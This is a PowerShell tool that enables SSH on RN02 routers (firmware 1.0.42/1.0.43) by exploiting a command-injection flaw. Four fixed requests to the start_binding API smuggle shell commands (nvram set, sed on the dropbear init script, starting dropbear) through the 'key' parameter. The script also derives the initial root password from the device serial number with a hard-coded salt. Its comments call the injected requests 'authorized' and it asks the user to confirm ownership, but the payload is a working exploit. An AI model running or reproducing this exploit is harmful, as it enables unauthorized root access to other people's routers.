#requires -Version 5.1
[CmdletBinding()]
param([string]$Router = '192.168.31.1')
Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Assert-RouterAddress([string]$Address) {
    $parsed = $null
    if ($Address -notmatch '^\d{1,3}(\.\d{1,3}){3}$' -or
        -not [Net.IPAddress]::TryParse($Address, [ref]$parsed) -or
        $parsed.AddressFamily -ne [Net.Sockets.AddressFamily]::InterNetwork -or
        $parsed.ToString() -ne $Address -or $Address -eq '0.0.0.0' -or $Address -eq '255.255.255.255') {
        throw 'Use a literal IPv4 address for your own router.'
    }
}
function ConvertFrom-PrivateString([Security.SecureString]$Value) {
    $pointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Value)
    try { [Runtime.InteropServices.Marshal]::PtrToStringBSTR($pointer) }
    finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($pointer) }
}
function Get-InitialRootPassword([string]$SerialNumber) {
    $sn = $SerialNumber.Trim()
    if ([string]::IsNullOrWhiteSpace($sn) -or $sn.Length -gt 128 -or $sn -match '[\x00-\x1f\x7f]') {
        throw 'Invalid serial number.'
    }
    # RN02 mkxqimage fixed salt. This derives the INITIAL password only.
    $salt = '6d2df50a-250f-4a30-a5e6-d44fb0960aa0'
    $md5 = [Security.Cryptography.MD5]::Create()
    try {
        $bytes = [Text.Encoding]::UTF8.GetBytes($sn + $salt)
        $hash = $md5.ComputeHash($bytes)
        ([BitConverter]::ToString($hash).Replace('-', '').ToLowerInvariant()).Substring(0, 8)
    } finally { $md5.Dispose() }
}
function Invoke-RouterJson([string]$Uri, [string]$Body = '') {
    $response = $null; $stream = $null; $buffer = $null
    try {
        $request = [Net.HttpWebRequest]::Create($Uri)
        $request.AllowAutoRedirect = $false
        $request.Timeout = 15000; $request.ReadWriteTimeout = 15000
        $request.Proxy = $null
        if ($Body.Length -gt 0) {
            $request.Method = 'POST'
            $request.ContentType = 'application/x-www-form-urlencoded'
            $payload = [Text.Encoding]::ASCII.GetBytes($Body)
            $request.ContentLength = $payload.Length
            $output = $request.GetRequestStream()
            try { $output.Write($payload, 0, $payload.Length) } finally { $output.Dispose() }
        }
        $response = $request.GetResponse()
        if ([int]$response.StatusCode -ne 200) { throw 'HTTP status rejected.' }
        $stream = $response.GetResponseStream()
        $buffer = New-Object IO.MemoryStream
        $chunk = New-Object byte[] 4096
        while (($count = $stream.Read($chunk, 0, $chunk.Length)) -gt 0) {
            if ($buffer.Length + $count -gt 65536) { throw 'Response exceeds limit.' }
            $buffer.Write($chunk, 0, $count)
        }
        $json = [Text.Encoding]::UTF8.GetString($buffer.ToArray()) | ConvertFrom-Json
        if ($null -eq $json.PSObject.Properties['code'] -or $json.code -is [string] -or $json.code -ne 0) {
            throw 'Router rejected this operation.'
        }
        return $json
    } catch { throw 'Router request failed. Check the address, firmware and authorized STOK. No further steps were sent.' }
    finally {
        if ($null -ne $buffer) { $buffer.Dispose() }
        if ($null -ne $stream) { $stream.Dispose() }
        if ($null -ne $response) { $response.Dispose() }
    }
}
function Enable-RouterSsh([string]$Address, [string]$Stok) {
    Assert-RouterAddress $Address
    if ($Stok -notmatch '^[A-Fa-f0-9]{32}$') { throw 'STOK must be 32 hexadecimal characters.' }
    $base = 'http://' + $Address + '/cgi-bin/luci/;stok=' + $Stok + '/api/xqsystem/'
    $info = Invoke-RouterJson ($base + 'init_info')
    if ($null -eq $info.PSObject.Properties['hardware'] -or $info.hardware -cne 'RN02' -or
        $null -eq $info.PSObject.Properties['romversion'] -or $info.romversion -notin @('1.0.42', '1.0.43')) {
        throw 'SSH enabling is supported only on RN02 firmware 1.0.42 / 1.0.43. No writes were sent.'
    }
    # init_info is public on this firmware. It does NOT authenticate STOK.
    # These are the four fixed authorized start_binding requests; never accept command text.
    $bodies = @(
        "uid=1234&key=1234'%0Anvram%20set%20ssh_en%3D1'",
        "uid=1234&key=1234'%0Anvram%20commit'",
        "uid=1234&key=1234'%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear'",
        "uid=1234&key=1234'%0A%2Fetc%2Finit.d%2Fdropbear%20start'"
    )
    for ($step = 0; $step -lt $bodies.Count; $step++) {
        $null = Invoke-RouterJson ($base + 'start_binding') $bodies[$step]
        Write-Host ('Accepted SSH setup request {0}/4.' -f ($step + 1))
    }
    Write-Host 'The router accepted all four requests. SSH login must still be confirmed.'
}
function Start-EnableSsh([string]$Address) {
    Assert-RouterAddress $Address
    if ($null -eq (Get-Command ssh -ErrorAction SilentlyContinue)) { throw 'Install the Windows OpenSSH Client first.' }
    Write-Host 'Only use this on your own RN02 router with authorized backend access.'
    if ((Read-Host 'Confirm ownership and authorize the four SSH setup requests [yes/NO]') -cne 'yes') {
        throw 'SSH setup cancelled.'
    }
    $secureStok = Read-Host 'Backend STOK (not the web password)' -AsSecureString
    $stokText = ConvertFrom-PrivateString $secureStok
    try { Enable-RouterSsh $Address $stokText } finally { $stokText = $null; $secureStok.Dispose() }
    Write-Host 'The serial number derives only the initial root password. A changed password cannot be recovered here.'
    Write-Host 'This tool does not reset your root password.'
    if ((Read-Host 'Show the initial password candidate from your SN [yes/NO]') -ceq 'yes') {
        $sn = Read-Host 'Router serial number'
        $candidate = Get-InitialRootPassword $sn
        Write-Host ('Initial root password candidate: ' + $candidate)
        $candidate = $null; $sn = $null
    }
    Write-Host 'Confirm the router host key. Enter your CURRENT root password at the SSH prompt if needed.'
    & ssh -o 'HostKeyAlgorithms=+ssh-rsa' -o 'StrictHostKeyChecking=ask' -o 'ConnectTimeout=15' ('root@' + $Address) 'printf be6500panel-ssh-confirmed'
    if ($LASTEXITCODE -ne 0) { throw 'SSH login failed. SSH availability was not confirmed.' }
    Write-Host 'SSH login confirmed.'
}
if ($MyInvocation.InvocationName -ne '.') { Start-EnableSsh $Router }
